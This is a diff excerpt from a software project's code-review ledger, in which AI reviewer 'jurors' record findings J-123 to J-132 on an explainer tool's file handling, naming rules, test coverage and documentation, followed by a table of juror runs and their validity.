+- validation: refuted: CT-3 (contracts.md:33) says `subprocess.TimeoutExpired` is `unreachable`, and CT-4 (line 50) says that after `unreachable` "no further block is rendered". The code does exactly what the approved contracts say, and the exit-0-with-a-note outcome is the specified one. The wording is the same lag already accepted on J-1 and J-98 (#127), and J-4 raised the same stop-after-unreachable behaviour.
+
+### J-123 `finish` deletes and overwrites files on disk before its single write
+- quote: "all in memory until step 8"
+- quote: "A run stopped before step 8 leaves explainer.md as it was, and a new run over it carries on from that."
+- situation (adversary): `render` writes each SVG straight to its final name (re-using an existing name overwrites the old image in place). `f.unlink()` then deletes the stale images, and only after that does `_put` write explainer.md. If `_put` fails (disk full, read-only file, kill), the old explainer.md still links images that are already deleted or replaced. The error is an uncaught `OSError` traceback, because the CLI catches only `ValueError`. So "writes and deletes nothing" holds only for refusals, not for a failed write.
+- fix: write explainer.md first (or render to temp names), then unlink; catch `OSError` in the CLI.
+- disposition: accepted-risk by system: minor, skipped at the round cap
+
+### J-124 `nio explain topic` continues a file on a substring hit anywhere in it, not on the stored topic
+- quote: "only if the topic text stored in it equals the new topic"
+- situation (adversary): `topic()` tests `want in " ".join(p.read_text().split())`, where `want` is `(topic: <text>)`. It searches the whole file, drill-downs and diagram sources included. A file about topic A whose walk-through or a pasted note contains the text `(topic: B)` is chosen as the continue target when the human asks for topic B. B's sections are appended to A's file, and no `-explainer-2.md` is written. The skill's own "never overwrite" intent is lost without notice. An unreadable or binary file at a candidate path also raises an uncaught `UnicodeDecodeError`, not the CLI's `error:` exit.
+- fix: compare only the first `(topic: ...)` record line, after whitespace normalising, for equality; catch `UnicodeDecodeError`.
+- disposition: accepted-risk by system: minor, skipped at the round cap
+
+### J-125 Nine e2e tests did not run, so seven or more ACs have no passing evidence
+- quote: "then four SVG files sit next to explainer.md, one per block, and the explainer shows each"
+- quote: "then that block is flagged as a broken diagram in the explainer and the other blocks still get their SVGs"
+- situation (conformance): the PR suite ran without NIO_E2E, so the tests for AC-1, AC-2, AC-3, AC-12, AC-13, AC-14, AC-30 and AC-32 are all recorded "didn't run". The render step of `finish` (SVG files per block, a broken block flagged, text-only notes) and plan-mode refusal are therefore unproven at the PR gate, though the code looks right on reading.
+- fix: run `NIO_E2E=1 uv run python tests/test_explain_e2e.py` and record the greens, or add integration tests of `explain.finish` with a stubbed render for AC-12, AC-13 and AC-14, so the evidence does not depend on a real model run
+- validation: merged: same as J-115
+
+### J-126 CT-2 node rule does not match the code
+- quote: "lines starting `%%`, `classDef`, `class `, `style `, `linkStyle`, `click `, `subgraph` or `end` are skipped"
+- quote: "An ID is a token `[A-Za-z_][\w]*` that is an endpoint of an arrow (`-->`, `---`, `-.->`, `==>`, `->>`, `-->>`, `->`)"
+- quote: "`if not line or line.startswith(SKIP) or line == "end" or line.startswith("end "):`"
+- situation (consistency): the code counts both IDs of `endpoint --> api` (test_ac5_node_cap asserts it), but read as CT-2 says, the whole line starts with `end` and is skipped, so neither ID counts. The code also counts endpoints of `A <--> B`, `C --o D` and `E --x F`, which the arrow list in CT-2 does not name, so B, D and F drop out under the literal text. Either way a diagram can be under-counted and pass the 20-node cap of AC-5 when it should fail.
+- fix: a change request against CT-2: name the word `end` as a whole word, and list the arrow forms the code accepts (or say "any arrow form"). Then the spec and the code agree.
+- validation: merged: same as J-38
+
+### J-127 CT-5 says everything is in memory until step 8; the code deletes files at step 5
+- quote: "Returns, doing in this order, all in memory until step 8:"
+- quote: "`for f in dels:` followed by `f.unlink()`, then `_put(p, ...)` writes explainer.md"
+- situation (consistency): old images are unlinked before explainer.md is written. If the step 8 write fails (full disk, interrupt), explainer.md is unchanged but its `(images:` and `![` lines still point at SVGs that are now gone. Rendering in step 6 also writes SVG files before step 8, which the spec's wording does not allow either. The spec's "A run stopped before step 8 leaves explainer.md as it was" is then true of the text but not of the files it links.
+- fix: the code is the side to change: collect the deletions and run them after the `_put` of step 8. The step 6 SVG writes can stay, since rendering needs files, but the spec should say so.
+- disposition: accepted-risk by system: minor, skipped at the round cap
+
+### J-128 CT-5 step 6 says the SVG name follows CT-6's rule; the code uses a different rule
+- quote: "named by CT-6's rule without the 40-character cut"
+- quote: "`re.sub(r"[^a-z0-9]+", "-", text.lower()).strip("-")[:40]`"
+- quote: "`base = p.stem + "--" + "-".join(re.sub(r"[^a-z0-9 ]", "", re.sub(r"[-/_]", " ", title.lower())).split())`"
+- situation (consistency): CT-6's rule turns every run of other characters into one dash, so the heading `## Flow: UJ-2 Node's lookup` gives `flow-uj-2-node-s-lookup`. The code deletes the apostrophe, so it gives `flow-uj-2-nodes-lookup`. Two headings that differ only by such punctuation can also collide under the code's rule but not under CT-6's.
+- fix: use CT-6's rule in the code (apply the same `re.sub` with `[^a-z0-9]+` and the 40-character cut dropped), or name the code's rule in CT-5.
+- disposition: accepted-risk by system: minor, skipped at the round cap
+
+### J-129 Node cap and walk-through checks never run on a topic explainer
+- quote: "a diagram is over the node cap (FR-7) or a walk-through is missing or too long (FR-6)"
+- quote: "if s["block"] and len(nodes(s["block"])) > 20:"
+- situation (correctness): `nio check explainer .nio/research/<day>-<topic>-explainer.md` is given a topic file with a 25-node diagram and no walk-through. FR-8 says the path form fails on both. The node-cap and walk-through loop sits inside `if plan_mode:`, so only the render check runs and the check passes.
+- fix: move the node-cap and walk-through loop out of the `if plan_mode:` block so it applies to every explainer. Keep the core-diagram and component-map checks plan-only.
+- validation: refuted: FR-15 says `nio check explainer` given a topic explainer's path "runs the render check alone", and AC-20 expects only a render pass with no core-diagram or contract finding. CT-4 (contracts.md:49) says "In topic mode only the `explainer missing` and `broken diagram` errors apply". The code keeps the node-cap and walk-through loop inside `if plan_mode:` as those say. FR-8's parenthetical "or a topic explainer's path" is the looser text, and the more specific FR-15, AC-20 and CT-4 govern.
+
+### J-130 finish names images with its own slug rule, not CT-6's
+- quote: "Renders each other Mermaid section's block (CT-3) to `<stem>--<title slug>.svg` beside the explainer (the title without the marker, named by CT-6's rule without the 40-character cut)"
+- quote: "The name is `re.sub(r"[^a-z0-9]+", "-", text.lower()).strip("-")[:40]`."
+- situation (integration): `finish` (src/nio/explain.py:269) maps `-/_` to spaces and then deletes every other non-alphanumeric character, so a section titled `Flow: UJ-1 Sign.in` renders to `explainer--flow-uj-1-signin.svg`, while CT-6's rule (implemented in `topic`, explain.py:342) gives `flow-uj-1-sign-in`. Two slug rules now live in one module, and the one finish uses is not the one the contract names.
+- fix: build the name with the same expression `topic` uses (one shared helper, no 40-character cut), or change CT-5 to state the rule finish uses.
+- disposition: accepted-risk by system: minor, skipped at the round cap
+
+### J-131 The contract and the skill still describe one joined drill-downs line
+- quote: "sets the images line to the SVGs it rendered plus the existing ones drill-down sections link, and the drill-downs line to every `## Drill-down: ` heading, the marker left out"
+- quote: "the drill-downs line: `(drill-downs: <heading>; <heading>)`"
+- situation (integration): since T-29, `finish` writes one `(drill-down: <heading>)` line per section (explain.py:301) and reads the old joined line only as a legacy form (explain.py:208). contracts.md (CT-5 step 7 and the data model) still specifies the joined `(drill-downs: a; b)` line, and the skill tells the agent to keep "the drill-downs lines". An agent or worker following the contract would write the form whose `; ` split T-29 had to fix.
+- fix: update CT-5 step 7 and the data model entry to the one-line-per-heading `(drill-down: …)` form, and name it so in the skill's plan-mode step 4.
+- disposition: accepted-risk by system: minor, skipped at the round cap
+
+### J-132 README, CLAUDE.md and the CLI help lag the shipped explainer
+- quote: "The README's skill table gains a row for it."
+- quote: "A new `explain` group with `finish <path>` and `topic <text>`"
+- situation (integration): the README row says "🚧 plan mode built" and describes plan mode only, though topic mode, the drill-down and the Format section have shipped (T-13, T-15, T-16). CLAUDE.md's self-check list omits `tests/test_explain.py` and the `NIO_E2E=1` `tests/test_explain_e2e.py` run. The `explain` subcommand help says `explain finish <slug>`, but finish takes a path and refuses a slug ("is not an explainer"). `check`'s docstring still says "Only the missing-file error so far" over a function that now runs every CT-4 check.
+- fix: mark the README row built and mention topic mode; add both test files to CLAUDE.md; change the help to `explain finish <path>`; drop the stale docstring clause.
+- disposition: accepted-risk by system: minor, skipped at the round cap
 
 ## Jurors
 
 | Juror | Lens | By | Context | Valid | Attempts | Round |
 | --- | --- | --- | --- | --- | --- | --- |
+| pr-adversary | adversary | juror / claude-code / sonnet | sufficient | yes | 1 | 10 |
 | pr-adversary~E1 | adversary | juror / claude-code / sonnet | sufficient | yes | 1 | 1 |
 | pr-adversary~E1-2 | adversary | juror / claude-code / claude-sonnet-5-5 |  | no: missing `context`; finding `1`: needs `### F<n> <title>` and ['fix']; finding `2`: needs `### F<n> <title>` and ['fix']; finding `3`: needs `### F<n> <title>` and ['fix']; finding `4`: needs `### F<n> <title>` and ['fix']; finding `5`: needs `### F<n> <title>` and ['fix'] | 2 | 5 |
 | pr-adversary~E1-3 | adversary | juror / claude-code / claude-sonnet-5-5 |  | no: missing `context`; finding `F-1`: needs `### F<n> <title>` and ['fix']; finding `F-2`: needs `### F<n> <title>` and ['fix']; finding `F-3`: needs `### F<n> <title>` and ['fix']; finding `F-4`: needs `### F<n> <title>` and ['fix']; finding `F-5`: needs `### F<n> <title>` and ['fix'] | 2 | 5 |
@@ -855,6 +1054,7 @@ outcome: rerun
 | pr-adversary~E8 | adversary | juror / claude-code / sonnet | sufficient | yes | 1 | 1 |
 | pr-adversary~E9 | adversary |  |  | no: missing --- frontmatter block | 1 | 1 |
 | pr-adversary~rest | adversary | juror / claude-code / sonnet | limited | yes | 2 | 2 |
+| pr-conformance | conformance | juror / claude-code / sonnet | sufficient | yes | 1 | 10 |
 | pr-conformance~E1 | conformance | juror / claude-code / sonnet | sufficient | yes | 2 | 2 |
 | pr-conformance~E1-2 | conformance | juror / claude-code / sonnet | sufficient | yes | 1 | 6 |
 | pr-conformance~E1-3 | conformance | juror / claude-code / sonnet | sufficient | yes | 1 | 6 |
@@ -867,6 +1067,7 @@ outcome: rerun
 | pr-conformance~E8 | conformance | juror / claude-code / sonnet | sufficient | yes | 1 | 1 |
 | pr-conformance~E9 | conformance |  |  | no: missing --- frontmatter block | 1 | 1 |
 | pr-conformance~rest | conformance | juror / claude-code / sonnet | sufficient | yes | 1 | 2 |
+| pr-consistency | consistency | juror / claude-code / claude-haiku-5-5 | sufficient | yes | 1 | 10 |
 | pr-consistency~E1 | consistency | juror / claude-code / claude-haiku-5-5 | limited | yes | 1 | 1 |
 | pr-consistency~E1-2 | consistency | juror / claude-code / claude-haiku-5-5 | limited | no: F5: cites must hold an AC, FR or CT ID | 1 | 5 |
 | pr-consistency~E1-3 | consistency | juror / claude-code / claude-haiku-5-5 | limited | yes | 1 | 5 |
@@ -879,6 +1080,7 @@ outcome: rerun
 | pr-consistency~E8 | consistency | juror / claude-code / claude-haiku-5-5 | sufficient | yes | 1 | 1 |
 | pr-consistency~E9 | consistency | juror / claude-code / claude-haiku-5-5 | sufficient | yes | 1 | 1 |
 | pr-consistency~rest | consistency | juror / claude-code / claude-haiku-5-5 | sufficient | yes | 2 | 2 |
+| pr-correctness | correctness | juror / claude-code / sonnet | sufficient | yes | 1 | 10 |
 | pr-correctness~E1 | correctness | juror / claude-code / sonnet | sufficient | no: finding `F3 committed fix tasks skip every fix-task check`: needs `### F<n> <title>` and ['cites'] | 2 | 2 |
 | pr-correctness~E2 | correctness |  |  | no: missing --- frontmatter block | 1 | 1 |
 | pr-correctness~E3 | correctness | juror / claude-code / sonnet | sufficient | yes | 1 | 1 |
@@ -891,6 +1093,6 @@ outcome: rerun
 | pr-correctness~E8-3 | correctness | juror / claude-code / sonnet | sufficient | yes | 1 | 7 |
 | pr-correctness~E9 | correctness | juror / claude-code / opus-5.5 | sufficient | yes | 1 | 3 |
 | pr-correctness~rest | correctness | juror / claude-code / sonnet | sufficient | no: F3: cites must hold an AC, FR or CT ID; F4: cites must hold an AC, FR or CT ID | 1 | 1 |
-| pr-integration | integration | juror / claude-code / opus | sufficient | yes | 1 | 1 |
+| pr-integration | integration | juror / claude-code / claude-opus-5-5 | sufficient | yes | 1 | 10 |
 | pr-integration-2 | integration | juror / claude-code / opus | sufficient | yes | 1 | 8 |
 | pr-integration-3 | integration | juror / claude-code / opus | sufficient | yes | 1 | 8 |
